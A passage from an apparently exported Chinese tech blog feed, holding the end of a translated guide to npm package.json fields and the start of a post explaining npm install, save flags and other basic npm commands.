<code>node-semver</code> 解析，它被包在 <code>npm</code> 的依赖中。（要自己用可以执行 <code>npm install semver</code>）</p></blockquote><p>可用的”数字”或者”范围”见 <a href="//npmjs.org/doc/misc/semver.html">semver</a>。</p><h2 id="description"><a href="#description" class="headerlink" title="description"></a>description</h2><p>放简介，字符串。方便屌丝们在 <code>npm search</code> 中搜索。</p><h2 id="keywords"><a href="#keywords" class="headerlink" title="keywords"></a>keywords</h2><p>关键字，数组、字符串。还是方便屌丝们在 <code>npm search</code> 中搜索。</p><h2 id="homepage"><a href="#homepage" class="headerlink" title="homepage"></a>homepage</h2><p>项目官网的 <code>url</code>。</p><p>注意：这和 <code>“url”</code> 不一样。如果你放一个<code>“url”</code> 字段，<code>registry</code> 会以为是一个跳转到你发布在其他地方的地址，然后喊你滚粗。</p><p>嗯，滚粗，没开玩笑。</p><h2 id="bugs"><a href="#bugs" class="headerlink" title="bugs"></a>bugs</h2><blockquote><p>你项目的提交问题的 <code>url</code> 和（或）<code>邮件地址</code>。这对遇到问题的屌丝很有帮助。 差不多长这样：</p></blockquote><pre><code class="json">{
  &quot;url&quot; : &quot;https://github.com/owner/project/issues&quot;,
  &quot;email&quot; : &quot;project@hostname.com&quot;
}
</code></pre><p>你可以指定一个或者指定两个。如果你只想提供一个 <code>url</code>，那就不用对象了，字符串就行。 如果提供了 <code>url</code>，它会被 <code>npm bugs</code> 命令使用。</p><h2 id="license"><a href="#license" class="headerlink" title="license"></a>license</h2><blockquote><p>你应该要指定一个许可证，让人知道使用的权利和限制的。<br><br>最简单的方法是，假如你用一个像 <code>BSD</code> 或者 <code>MIT</code> 这样通用的许可证，就只需要指定一个许可证的名字，像这样：</p></blockquote><pre><code class="json">{
  &quot;license&quot; : &quot;BSD&quot;
}
</code></pre><p>如果你又更复杂的许可条件，或者想要提供给更多地细节，可以这样:</p><pre><code class="json">&quot;licenses&quot; : [
  {
    &quot;type&quot; : &quot;MyLicense&quot; ,
    &quot;url&quot; : &quot;&lt;https://github.com/owner/project/path/to/license&gt;&quot;
  }
]
</code></pre><p>在根目录中提供一个许可证文件也蛮好的。</p><h2 id="people-fields-author-contributors"><a href="#people-fields-author-contributors" class="headerlink" title="people fields: author, contributors"></a>people fields: author, contributors</h2><blockquote><p><code>author</code> 是一个人。<code>contributors</code> 是一堆人的数组。<code>person</code> 是一个有 <code>name</code> 字段，可选的有 <code>url</code>、<code>email</code> 字段的对象，像这样：</p></blockquote><pre><code class="json">{
  &quot;name&quot; : &quot;Barney Rubble&quot;,
  &quot;email&quot; : &quot;b@rubble.com&quot;,
  &quot;url&quot; : &quot;//barnyrubble.tumblr.com/&quot;
}
</code></pre><p>或者可以把所有的东西都放到一个字符串里，`npm ``会给你解析：</p><pre><code class="json">{
  &quot;Barney Rubble &lt;b@rubble.com&gt; (//barnyrubble.tumblr.com/)&quot;
}
</code></pre><p><code>email</code> 和 <code>url</code> 在两种形式中都是可选的。</p><p>也可以在你的 <code>npm</code> 用户信息中设置一个顶级的 <code>maintainers</code> 字段。</p><h2 id="files"><a href="#files" class="headerlink" title="files"></a>files</h2><blockquote><p><code>files</code> 是一个包含项目中的文件的数组。如果命名了一个文件夹，那也会包含文件夹中的文件。（除非被其他条件忽略了）</p></blockquote><p>你也可以提供一个 <code>.npmignore</code> 文件，让即使被包含在 <code>files</code> 字段中得文件被留下。其实就像 <code>.gitignore</code> 一样。</p><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><blockquote><p><code>main</code> 字段配置一个文件名指向模块的入口程序。如果你包的名字叫 <code>foo</code>，然后用户 <code>require(&quot;foo&quot;)</code>，<code>main</code> 配置的模块的 <code>exports</code> 对象会被返回。</p></blockquote><p>这应该是一个相对于根目录的文件路径。</p><p>对于大多数模块，它是非常有意义的，其他的都没啥。</p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><blockquote><p>很多包都有一个或多个可执行的文件希望被放到 <code>PATH</code> 中。<code>npm</code> 让妈妈再也不用担心了（实际上，就是这个功能让 <code>npm</code> 可执行的）。<br><br>要用这个功能，给 <code>package.json</code> 中的 <code>bin</code>字段一个命令名到文件位置的 <code>map</code>。初始化的时候 <code>npm</code> 会将他链接到 <code>prefix/bin（全局初始化）</code>或者 <code>./node_modules/.bin/（本地初始化）</code>。</p></blockquote><p>比如，<code>npm</code> 有：</p><pre><code class="json">{
  &quot;bin&quot; : {
      &quot;npm&quot; : &quot;./cli.js&quot;
  }
}
</code></pre><p>所以，当你初始化 <code>npm</code>，它会创建一个符号链接到 <code>cli.js</code> 脚本到 <code>/usr/local/bin/npm</code>。</p><p>如果你只有一个可执行文件，并且名字和包名一样。那么你可以只用一个字符串，比如：</p><pre><code class="json">{
  &quot;name&quot;: &quot;my-program&quot; ,
  &quot;version&quot;: &quot;1.2.5&quot; ,
  &quot;bin&quot;: &quot;./path/to/program&quot;
}
</code></pre><p>结果和这个一样：</p><pre><code class="json">{
  &quot;name&quot;: &quot;my-program&quot; ,
  &quot;version&quot;: &quot;1.2.5&quot; ,
  &quot;bin&quot; : {
    &quot;my-program&quot; : &quot;./path/to/program&quot;
  }
}
</code></pre><h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><blockquote><p>指定一个单一的文件或者一个文件数组供 <code>man</code> 程序使用。<br><br>如果只提供一个单一的文件，那么它初始化后就是 <code>man &lt;pkgname&gt;</code> 的结果，而不管实际的文件名是神马，比如：</p></blockquote><pre><code class="json">{
  &quot;name&quot; : &quot;foo&quot;,
  &quot;version&quot; : &quot;1.2.3&quot;,
  &quot;description&quot; : &quot;A packaged foo fooer for fooing foos&quot;,
  &quot;main&quot; : &quot;foo.js&quot;,
  &quot;man&quot; : &quot;./man/doc.1&quot;
}
</code></pre><p>这样 <code>man foo</code> 就可以用到 <code>./man/doc.1</code> 文件了。</p><p>如果文件名不是以包名开头，那么它会被冠以前缀，下面的：</p><pre><code class="json">{
  &quot;name&quot; : &quot;foo&quot; ,
  &quot;version&quot; : &quot;1.2.3&quot; ,
  &quot;description&quot; : &quot;A packaged foo fooer for fooing foos&quot; ,
  &quot;main&quot; : &quot;foo.js&quot; ,
  &quot;man&quot; :
    [
      &quot;./man/foo.1&quot;,
      &quot;./man/bar.1&quot;
    ]
}
</code></pre><p>会为 <code>man foo</code> 和 <code>man foo-bar</code> 创建文件。</p><blockquote><p><code>man</code> 文件需要以数字结束，然后可选地压缩后以 <code>.gz</code> 为后缀。</p></blockquote><pre><code class="json">{
  &quot;name&quot; : &quot;foo&quot; ,
  &quot;version&quot; : &quot;1.2.3&quot; ,
  &quot;description&quot; : &quot;A packaged foo fooer for fooing foos&quot; ,
  &quot;main&quot; : &quot;foo.js&quot; ,
  &quot;man&quot; :
    [
      &quot;./man/foo.1&quot;,
      &quot;./man/foo.2&quot;
    ]
}
</code></pre><p>会为 <code>man foo</code> 和 <code>man 2 foo</code> 创建。</p><h2 id="directories"><a href="#directories" class="headerlink" title="directories"></a>directories</h2><blockquote><p><code>CommonJS Packages</code> 规范说明了几种方式让你可以用 <code>directorieshash</code> 标示出包得结构。如果看一下 <code>npm&#39;s package.json</code>，你会看到有 <code>directories</code> 标示出 doc, lib, and man。</p></blockquote><p>在未来，这个信息可能会被用到。</p><h2 id="directories-lib"><a href="#directories-lib" class="headerlink" title="directories.lib"></a>directories.lib</h2><blockquote><p>告诉屌丝们你的库文件夹在哪里。目前没有什么特别的东西需要用到 <code>lib</code> 文件夹，但确实是重要的元信息。</p></blockquote><h2 id="directories-bin"><a href="#directories-bin" class="headerlink" title="directories.bin"></a>directories.bin</h2><blockquote><p>如果你指定一个 <code>&quot;bin&quot;</code> 目录，然后在那个文件夹中得所有文件都会被当做 <code>&quot;bin&quot;</code> 字段使用。<br><br>如果你已经指定了 <code>&quot;bin&quot;</code> 字段，那这个就无效。</p></blockquote><h2 id="directories-man"><a href="#directories-man" class="headerlink" title="directories.man"></a>directories.man</h2><blockquote><p>一个放满 <code>man</code> 页面的文件夹。贴心地创建一个 <code>&quot;man&quot;</code> 字段。</p></blockquote><h2 id="directories-doc"><a href="#directories-doc" class="headerlink" title="directories.doc"></a>directories.doc</h2><blockquote><p>将 <code>markdown</code>文件放在这里。最后，这些会被很好地展示出来，</p></blockquote><h2 id="directories-example"><a href="#directories-example" class="headerlink" title="directories.example"></a>directories.example</h2><blockquote><p>将事例脚本放在这里。某一天，它可能会以聪明的方式展示出来。</p></blockquote><h2 id="repository"><a href="#repository" class="headerlink" title="repository"></a>repository</h2><blockquote><p>指定你的代码存放的地方。这个对希望贡献的人有帮助。如果git仓库在github上，那么npm docs命令能找到你。</p></blockquote><p>这样做：</p><pre><code class="json">&quot;repository&quot; : {
  &quot;type&quot; : &quot;git&quot; ,
  &quot;url&quot; : &quot;&lt;https://github.com/isaacs/npm.git&gt;&quot;
}

&quot;repository&quot; : {
  &quot;type&quot; : &quot;svn&quot; ,
  &quot;url&quot; : &quot;&lt;http://v8.googlecode.com/svn/trunk/&gt;&quot;
}
</code></pre><blockquote><p><code>URL</code> 应该是公开的（即便是只读的）能直接被未经过修改的版本控制程序处理的 <code>url</code>。不应该是一个html的项目页面。因为它是给计算机看的。</p></blockquote><h2 id="scripts"><a href="#scripts" class="headerlink" title="scripts"></a>scripts</h2><blockquote><p><code>&quot;scripts&quot;</code> 是一个由脚本命令组成的 <code>hash</code> 对象，他们在包不同的生命周期中被执行。<code>key</code> 是生命周期事件，<code>value</code> 是要运行的命令。<br><br>参见 <a href="//npmjs.org/doc/misc/npm-scripts.html">npm-scripts</a></p></blockquote><h2 id="config"><a href="#config" class="headerlink" title="config"></a>config</h2><blockquote><p><code>&quot;config&quot; hash</code>可以用来配置用于包脚本中的跨版本参数。在实例中，如果一个包有下面的配置：</p></blockquote><pre><code class="json">{
  &quot;name&quot; : &quot;foo&quot;,
  &quot;config&quot; : {
    &quot;port&quot; : &quot;8080&quot;
  }
}
</code></pre><p>然后有一个 <code>“start”</code> 命令引用了 <code>npm_package_config_port</code> 环境变量，用户可以通过 <code>npm config set foo:port 8001</code> 来重写他。</p><blockquote><p>参见 <a href="//npmjs.org/doc/misc/npm-config.html">npm-config</a> 和 <a href="//npmjs.org/doc/misc/npm-scripts.html">npm-scripts</a>。</p></blockquote><h2 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h2><blockquote><p>依赖是给一组包名指定版本范围的一个 <code>hash</code>。这个版本范围是一个由一个或多个空格分隔的字符串。依赖还可以用 <code>tarball</code> 或者 <code>git URL</code>。<br><br>请不要将测试或过渡性的依赖放在 <code>dependencieshash</code> 中。见下文的 <code>devDependencies</code>。<br><br>详见 <a href="//npmjs.org/doc/misc/semver.html">semver</a></p></blockquote><ul><li><code>version</code> 必须完全和 <code>version</code> 一致</li><li><code>&gt;version</code> 必须比 <code>version</code> 大</li><li><code>&gt;=version</code> 同上</li><li><code>&lt;version</code> 同上</li><li><code>&lt;=version</code> 同上</li><li><code>~version</code> 大约一样，见 <a href="//npmjs.org/doc/misc/semver.html">semver</a></li><li><code>1.2.x</code>,<code>1.2.0</code>,<code>1.2.1</code>,等，但不包括 <code>1.3.0</code></li><li><code>//...</code> 见下文 <code>&#39;依赖 URL&#39;</code></li><li><code>*</code>所有</li><li><code>&quot;&quot;</code> 空，同 <code>*</code></li><li><code>version1 - version2</code> 同 <code>&gt;=version1 &lt;=version2</code></li><li><code>range1 || range2</code> 二选一。</li><li><code>git...</code> 见下文 <code>&#39;依赖Git URL&#39;</code></li><li><code>user/repo</code> 见下文 <code>&#39;GitHub URLs&#39;</code></li></ul><p>比如下面都是合法的：</p><pre><code class="json">{
  &quot;dependencies&quot; :
  {
    &quot;foo&quot; : &quot;1.0.0 - 2.9999.9999&quot;,
    &quot;bar&quot; : &quot;&gt;=1.0.2 &lt;2.1.2&quot;,
    &quot;baz&quot; : &quot;&gt;1.0.2 &lt;=2.3.4&quot;,
    &quot;boo&quot; : &quot;2.0.1&quot;,
    &quot;qux&quot; : &quot;&lt;1.0.0 || &gt;=2.3.1 &lt;2.4.5 || &gt;=2.5.2 &lt;3.0.0&quot;,
    &quot;asd&quot; : &quot;//asdf.com/asdf.tar.gz&quot;,
    &quot;til&quot; : &quot;~1.2&quot;,
    &quot;elf&quot; : &quot;~1.2.3&quot;,
    &quot;two&quot; : &quot;2.x&quot;,
    &quot;thr&quot; : &quot;3.3.x&quot;,
  }
}
</code></pre><h2 id="依赖-URL"><a href="#依赖-URL" class="headerlink" title="依赖 URL"></a>依赖 URL</h2><blockquote><p>可以指定一个 <code>tarball URL</code>，这个 <code>tarball</code> 将在包被初始化的时候下载并初始化。</p></blockquote><h2 id="依赖-Git-URL"><a href="#依赖-Git-URL" class="headerlink" title="依赖 Git URL"></a>依赖 Git URL</h2><blockquote><p><code>Git urls</code> 可以是下面几种形式：</p></blockquote><ul><li>git: <a href="https://github.com/user/project.git#commit-ish" target="_blank" rel="external">https://github.com/user/project.git#commit-ish</a></li><li>git+ssh: <a href="mailto:https://user@hostname:project.git#commit-ish" target="_blank" rel="external">https://user@hostname:project.git#commit-ish</a></li><li>git+ssh: <a href="mailto:https://user@hostname/project.git#commit-ish" target="_blank" rel="external">https://user@hostname/project.git#commit-ish</a></li><li>git+<a href="mailto:https://user@hostname/project/blah.git#commit-ish" target="_blank" rel="external">https://user@hostname/project/blah.git#commit-ish</a></li><li>git+<a href="mailto:https://user@hostname/project/blah.git#commit-ish" target="_blank" rel="external">https://user@hostname/project/blah.git#commit-ish</a></li></ul><blockquote><p><code>commit-ish</code> 是可以被 <code>git checkout</code> 的任何 <code>tag、sha</code> 或者 <code>branch</code>。默认为 <code>master</code>。</p></blockquote><h2 id="GitHub-URLs"><a href="#GitHub-URLs" class="headerlink" title="GitHub URLs"></a>GitHub URLs</h2><blockquote><p><code>1.1.65</code> 版后，你可以仅仅用 <code>“user/foo-project”</code> 引用 <code>GitHub urls</code>，比如：</p></blockquote><pre><code class="json">{
  &quot;name&quot;: &quot;foo&quot;,
  &quot;version&quot;: &quot;0.0.0&quot;,
  &quot;dependencies&quot;: {
    &quot;express&quot;: &quot;visionmedia/express&quot;
  }
}
</code></pre><h2 id="devDependencies"><a href="#devDependencies" class="headerlink" title="devDependencies"></a>devDependencies</h2><blockquote><p>如果有人要使用你的模块，那么他们可能不需要你开发使用的外部测试或者文档框架。<br><br>在这种情况下，最好将这些附属的项目列在 <code>devDependencies</code> 中。</p></blockquote><p>这些东西会在执行 <code>npm link</code> 或者 <code>npm install</code> 的时候初始化，并可以像其他 <code>npm</code> 配置参数一样管理。详见 <a href="//npmjs.org/doc/misc/npm-config.html">npm-config</a>。</p><p>对于非特定平台的构建步骤，比如需要编译<code>CoffeeScript</code>，可以用 <code>prepublish</code> 脚本去实现，并把它依赖的包放在 <code>devDependency</code> 中。（注：<code>prepublish</code> 定义了在执行 <code>npm publish</code> 的时候先行执行的脚本）</p><p>比如：</p><pre><code class="json">{
  &quot;name&quot;: &quot;ethopia-waza&quot;,
  &quot;description&quot;: &quot;a delightfully fruity coffee varietal&quot;,
  &quot;version&quot;: &quot;1.2.3&quot;,
  &quot;devDependencies&quot;: {
    &quot;coffee-script&quot;: &quot;~1.6.3&quot;
  },
  &quot;scripts&quot;: {
    &quot;prepublish&quot;: &quot;coffee -o lib/ -c src/waza.coffee&quot;
  },
  &quot;main&quot;: &quot;lib/waza.js&quot;
}
</code></pre><p><code>prepublish</code> 脚本会在 <code>publishing</code> 前运行，这样用户就不用自己去 <code>require</code> 来编译就能使用。并且在开发模式中（比如本地运行 <code>npm install</code>）会运行这个脚本以便更好地测试。</p><h2 id="peerDependencies"><a href="#peerDependencies" class="headerlink" title="peerDependencies"></a>peerDependencies</h2><blockquote><p>在一些场景中，如在一个 <code>host</code> 中不必须进行 <code>require</code> 时候，你想表现你的 <code>package</code> 与一个 <code>host</code> 工具或者库的兼容关键。这一般用来引用插件。尤其是你的模块可能要暴露一个特定的接口，并由 <code>host</code> 文档来预期和指定。</p></blockquote><p>比如：</p><pre><code class="json">{
  &quot;name&quot;: &quot;tea-latte&quot;,
  &quot;version&quot;: &quot;1.3.5&quot;
  &quot;peerDependencies&quot;: {
    &quot;tea&quot;: &quot;2.x&quot;
  }
}
</code></pre><p>这能保证你的 <code>package</code> 可以只和 <code>tea</code> 的 <code>2.x 版本</code>一起初始化。<code>npm install tea-latte</code> 可能会产生下面的依赖关系</p><pre><code class="json">â”œâ”€â”€ tea-latte@1.3.5
â””â”€â”€ tea@2.2.0
</code></pre><p>试图初始化另一个有会冲突的依赖的插件将导致一个错误。因此，确保你的插件的需求约束越弱越好，而不要去把它锁定到一个特定的版本。</p><p>假设这个 <code>host</code> 遵守 <code>semver</code> 规范，只改变这个 <code>package</code> 的主版本会打破你的插件。因此，如果你在 <code>package</code> 中用过每个 <code>1.x 版本</code>，就用 <code>&quot;^1.0&quot;</code> 或者 “<code>1.x&quot;</code> 来表示。如果你依赖于功能介绍 <code>1.5.2</code>，用 <code>&quot;&gt;= 1.5.2 &lt; 2&quot;</code>。</p><h2 id="bundledDependencies"><a href="#bundledDependencies" class="headerlink" title="bundledDependencies"></a>bundledDependencies</h2><blockquote><p>一组包名，他们会在发布的时候被打包进去。<br><br>拼成 <code>&quot;bundleDependencies&quot;</code>（缺d）也可以： <code>optionalDependencies</code>。</p></blockquote><p>如果一个依赖可用，但你希望在它安装错误的时候 <code>npm</code> 也能继续初始化，那么你可以把它放在 <code>optionalDependencies hash</code> 中。这是一个包名到版本或者 <code>url</code> 的 <code>map</code>，就像 <code>dependencies hash</code> 一样。只是它运行错误。</p><p>处理缺乏依赖也是你的程序的责任。比如像这样：</p><pre><code class="javascript">try {
  var foo = require(&#39;foo&#39;)
  var fooVersion = require(&#39;foo/package.json&#39;).version
} catch (er) {
  foo = null
}
if ( notGoodFooVersion(fooVersion) ) {
  foo = null
}

// .. then later in your program ..

if (foo) {
  foo.doFooThings()
}
</code></pre><p><code>optionalDependencies</code> 会覆盖 <code>dependencies</code> 中同名的项，所以通常比只放在一个地方好。</p><h2 id="engines"><a href="#engines" class="headerlink" title="engines"></a>engines</h2><blockquote><p>你可以指定工作的 <code>node</code> 的版本：</p></blockquote><pre><code class="json">{
  &quot;engines&quot; : {
    &quot;node&quot; : &quot;&gt;=0.10.3 &lt;0.12&quot;
  }
}
</code></pre><blockquote><p>像 <code>dependensies</code> 一样，如果你不指定版本或者指定 <code>&quot;*&quot;</code> 作为版本，那么所有版本的 <code>node</code> 都可以。</p></blockquote><p>如果指定一个 <code>&quot;engines&quot;</code> 字段，那么 <code>npm</code> 会需要 <code>node</code> 在里面，如果 <code>&quot;engines&quot;</code> 被省略，<code>npm</code> 会假定它在 <code>node</code> 上工作。</p><p>你也可以用 <code>&quot;engines&quot;</code> 字段来指定哪一个 <code>npm</code> 版本能更好地初始化你的程序，如：</p><pre><code class="json">{
  &quot;engines&quot; : {
    &quot;npm&quot; : &quot;~1.0.20&quot;
  }
}
</code></pre><blockquote><p>记住，除非用户设置 <code>engine-strict</code> 标记，这个字段只是建议值。</p></blockquote><h2 id="engineStrict"><a href="#engineStrict" class="headerlink" title="engineStrict"></a>engineStrict</h2><blockquote><p>如果你确定你的模块一定不会运行在你指定版本之外的 <code>node</code> 或者 <code>npm</code> 上，你可以在 <code>package.json</code> 文件中设置 <code>&quot;engineStrict&quot;:true</code>。它会重写用户的 <code>engine-strict</code> 设置。<br><br>除非你非常非常确定，否则不要这样做。如果你的 <code>engines hash</code>过度地限制，很可能轻易让自己陷入窘境。慎重地考虑这个选择。如果大家滥用它，它会再以后的 <code>npm</code> 版本中被删除。</p></blockquote><h2 id="os"><a href="#os" class="headerlink" title="os"></a>os</h2><blockquote><p>你可以指定你的模块要运行在哪些操作系统中：</p></blockquote><pre><code class="json">{
&quot;os&quot; : [ &quot;darwin&quot;, &quot;linux&quot; ]
}
</code></pre><p>你也可以用黑名单代替白名单，在名字前面加上”!”就可以了：</p><pre><code class="json">{
&quot;os&quot; : [ &quot;!win32&quot; ]
}
</code></pre><blockquote><p>操作系统用 <code>process.platform</code> 来探测。虽然没有很好地理由，但它是同时支持黑名单和白名单的。</p></blockquote><h2 id="cpu"><a href="#cpu" class="headerlink" title="cpu"></a>cpu</h2><blockquote><p>如果你的代码只能运行在特定的 <code>cpu</code> 架构下，你可以指定一个：</p></blockquote><pre><code class="json">{
  &quot;cpu&quot; : [ &quot;x64&quot;, &quot;ia32&quot; ]
}
</code></pre><p>就像 <code>os</code> 选项，你也可以黑一个架构：</p><pre><code class="json">{
  &quot;cpu&quot; : [ &quot;!arm&quot;, &quot;!mips&quot; ]
}
</code></pre><blockquote><p><code>cpu</code> 架构用 <code>process.arch</code> 探测。</p></blockquote><h2 id="preferGlobal"><a href="#preferGlobal" class="headerlink" title="preferGlobal"></a>preferGlobal</h2><blockquote><p>如果包主要是需要全局安装的命令行程序，就设置它为 <code>true</code> 来提供一个 <code>warning</code> 给只在局部安装的人。<br><br>它不会真正的防止用户在局部安装，但如果它没有按预期工作它会帮助防止产生误会。</p></blockquote><h2 id="private"><a href="#private" class="headerlink" title="private"></a>private</h2><blockquote><p>如果你设置 <code>&quot;private&quot;: true</code>，<code>npm</code> 就不会发布它。<br><br>这是一个防止意外发布私有库的方式。如果你要确定给定的包是只发布在特定 <code>registry</code>（如内部 <code>registry</code>）的，用 <code>publishConfighash</code> 的描述来重写 <code>registry</code> 的 <code>publish-time</code> 配置参数。</p></blockquote><h2 id="publishConfig"><a href="#publishConfig" class="headerlink" title="publishConfig"></a>publishConfig</h2><blockquote><p>这是一个在 <code>publish-time</code> 使用的配置集合。当你想设置 <code>tag</code> 或者 <code>registry</code> 的时候它非常有用，所以你可以确定一个给定的包没有打上 <code>&quot;lastest&quot;</code> 的 <code>tag</code> 或者被默认发布到全局的公开 <code>registry</code>。</p></blockquote><p>任何配置都可以被重写，但当然可能只有 <code>&quot;tag&quot;</code> 和 <code>&quot;registry&quot;</code> 与发布的意图有关。</p><p>参见 <a href="//npmjs.org/doc/misc/npm-config.html">npm-config</a> 有可以被重写的列表。</p><h2 id="SEE-ALSO"><a href="#SEE-ALSO" class="headerlink" title="SEE ALSO"></a>SEE ALSO</h2><ul><li>semver</li><li>npm-init</li><li>npm-version</li><li>npm-config</li><li>npm-config</li><li>npm-help</li><li>npm-faq</li><li>npm-install</li><li>npm-publish</li><li>npm-rm</li></ul><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> node.js </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Node.js </tag>
            
            <tag> JSON </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[浅谈 Node.js 中的 npm]]></title>
      <url>/2016/08/talk-npm-on-node-js/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>主要介绍 npm 中的各个选项的作用以及其区别。npm 依赖于 Node.js，童鞋们要注意你的系统是否有 Node.js 环境<a id="more"></a></p><h1 id="npm-是什么"><a href="#npm-是什么" class="headerlink" title="npm 是什么"></a>npm 是什么</h1><blockquote><p>NPM 的全称是 Node Package Manager，是随同 Node.js 一起安装的包管理和分发工具，它很方便让 JavaScript 开发者下载、安装、上传以及管理已经安装的包。</p></blockquote><h1 id="npm-install-安装模块"><a href="#npm-install-安装模块" class="headerlink" title="npm install 安装模块"></a>npm install 安装模块</h1><blockquote><p>安装包，默认会安装最新的版本，最后所有的依赖会存放在 <code>node_modules</code> 目录下的，如：</p></blockquote><pre><code class="bash">$ npm install gulp
</code></pre><h2 id="全局安装"><a href="#全局安装" class="headerlink" title="全局安装"></a>全局安装</h2><blockquote><p>只需加上 <code>-g</code> 或者 <code>--global</code> 参数，就可以实现全局安装，如：</p></blockquote><pre><code class="bash">$ npm install gulp -g
</code></pre><h2 id="安装指定版本"><a href="#安装指定版本" class="headerlink" title="安装指定版本"></a>安装指定版本</h2><pre><code class="bash">$ npm install gulp@3.9.1
</code></pre><h1 id="S-–save"><a href="#S-–save" class="headerlink" title="-S, –save"></a>-S, –save</h1><h2 id="添加模块命令"><a href="#添加模块命令" class="headerlink" title="添加模块命令"></a>添加模块命令</h2><pre><code class="bash">$ npm install [module-name] --save
$ npm install [module-name] -S
</code></pre><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><blockquote><p>自动把模块和版本号添加至 <code>package.json</code> 的 <code>dependencies</code> （生产阶段的依赖）部分，避免了手动添加。</p></blockquote><p><code>package.json</code> 文件的 <code>dependencies</code> 字段：</p><pre><code class="json">&quot;dependencies&quot;: {
  &quot;[module-name]&quot;: &quot;^[version]&quot;
}
</code></pre><h1 id="D-–save-dev"><a href="#D-–save-dev" class="headerlink" title="-D, –save-dev"></a>-D, –save-dev</h1><h2 id="添加模块命令-1"><a href="#添加模块命令-1" class="headerlink" title="添加模块命令"></a>添加模块命令</h2><pre><code class="bash">$ npm install [module-name] --save-dev
$ npm install [module-name] -D
</code></pre><h2 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h2><blockquote><p>自动把模块和版本号添加至 <code>package.json</code> 的 <code>devDependencies</code>（开发阶段的依赖）部分，避免了手动添加。</p></blockquote><p><code>package.json</code> 文件的 <code>devDependencies</code> 字段：</p><pre><code class="json">&quot;devDependencies&quot;: {
  &quot;[module-name]&quot;: &quot;^[version]&quot;
}
</code></pre><h1 id="O-–save-optional"><a href="#O-–save-optional" class="headerlink" title="-O, –save-optional"></a>-O, –save-optional</h1><h2 id="添加模块命令-2"><a href="#添加模块命令-2" class="headerlink" title="添加模块命令"></a>添加模块命令</h2><pre><code class="bash">$ npm install [module-name] --save-optional
$ npm install [module-name] -O
</code></pre><h2 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h2><blockquote><p>自动把模块和版本号添加至 <code>package.json</code> 的 <code>optionalDependencies</code>（可选阶段的依赖）部分，避免了手动添加。</p></blockquote><p><code>package.json</code> 文件的 <code>optionalDependencies</code> 字段：</p><pre><code class="json">&quot;optionalDependencies&quot;: {
  &quot;[module-name]&quot;: &quot;^[version]&quot;
},
</code></pre><h1 id="E-–save-exact"><a href="#E-–save-exact" class="headerlink" title="-E, –save-exact"></a>-E, –save-exact</h1><h2 id="添加模块命令-3"><a href="#添加模块命令-3" class="headerlink" title="添加模块命令"></a>添加模块命令</h2><pre><code class="bash">$ npm install [module-name] --save-exact
$ npm install [module-name] -E
</code></pre><h2 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h2><blockquote><p>自动把模块和版本号添加至 <code>package.json</code> 的 <code>dependencies</code>（精确安装指定模块版本）部分，避免了手动添加。需要注意的是：<code>package.json</code> 文件的 <code>dependencies</code> 字段，版本号中的 <code>^</code> 消失了</p></blockquote><p><code>package.json</code> 文件的 <code>dependencies</code> 字段</p><pre><code class="json">&quot;dependencies&quot;: {
  &quot;[module-name]&quot;: &quot;[version]&quot;
}
</code></pre><h1 id="npm-其他命令"><a href="#npm-其他命令" class="headerlink" title="npm 其他命令"></a>npm 其他命令</h1><h2 id="创建-package-json-文件"><a href="#创建-package-json-文件" class="headerlink" title="创建 package.json 文件"></a>创建 package.json 文件</h2><blockquote><p>安装包的信息可保持到项目的 <code>package.json</code> 文件中，以便后续的其它的项目开发或者他人合作使用，也说 <code>package.json</code> 在项目中是必不可少的。</p></blockquote><pre><code class="bash">$ npm init
</code></pre><h2 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h2><blockquote><p>模块的依赖都被写入了 <code>package.json</code> 文件后，他人打开项目的根目录（项目开源、内部团队合作），时，只需一条命令就可以安装 <code>package.json</code> 中的依赖。</p></blockquote><pre><code class="bash">$ npm install
</code></pre><blockquote><p>加上 <code>--save</code> 会安装 <code>package.json</code> 中 <code>dependencies</code> 里的所有模块。</p></blockquote><pre><code class="bash">$ npm install --save
</code></pre><h2 id="卸载模块"><a href="#卸载模块" class="headerlink" title="卸载模块"></a>卸载模块</h2><blockquote><p>想要卸载模块也很简单。</p></blockquote><pre><code class="bash">$ npm uninstall [module-name]
</code></pre><blockquote><p>以上写法并不会改变 <code>package.json</code> 文件，使用 <code>-S | --save | -D | --save-dev | -O | --save-optional</code> 选项即可删除 <code>package.json</code> 文件中的依赖。<br><br>如使用 <code>--save</code> 选项，将会删除 <code>package.json</code> 文件 <code>dependencies</code>中的该模块名和版本号。</p></blockquote><pre><code class="bash">$ npm uninstall [module-name] --save
</code></pre><h2 id="更新模块"><a href="#更新模块" class="headerlink" title="更新模块"></a>更新模块</h2><blockquote><p>从服务器下载最新版本的模块。需要注意的是，最新版本的模块并不是最稳定的，模块还是选择相对稳定的版本较好。支持 <code>-g</code> 选项。</p></blockquote><pre><code class="bash">$ npm update [-g] [module-name]
</code></pre><h2 id="检查模块是否已经过时"><a href="#检查模块是否已经过时" class="headerlink" title="检查模块是否已经过时"></a>检查模块是否已经过时</h2><blockquote><p>此命令会列出所有已经过时的包，可以及时进行包的更新.</p></blockquote><pre><code class="bash">$ npm outdated
</code></pre><h2 id="启动模块"><a href="#启动模块" class="headerlink" title="启动模块"></a>启动模块</h2><pre><code class="bash">npm start [-- &lt;args&gt;]
</code></pre><blockquote><p>该命令写在 <code>package.json</code> 文件 <code>scripts</code> 的 <code>start</code> 字段中，可以自定义命令来配置一个服务器环境和安装一系列的必要程序，如:</p></blockquote><pre><code class="json">&quot;scripts&quot;: {
  &quot;start&quot;: &quot;gulp -s&quot;
}
</code></pre><blockquote><p>如果 <code>package.json</code> 文件没有设置 <code>start</code>，则将直接启动 <code>node server.js</code></p></blockquote><h2 id="停止模块"><a href="#停止模块" class="headerlink" title="停止模块"></a>停止模块</h2><pre><code class="bash">npm stop [-- &lt;args&gt;]
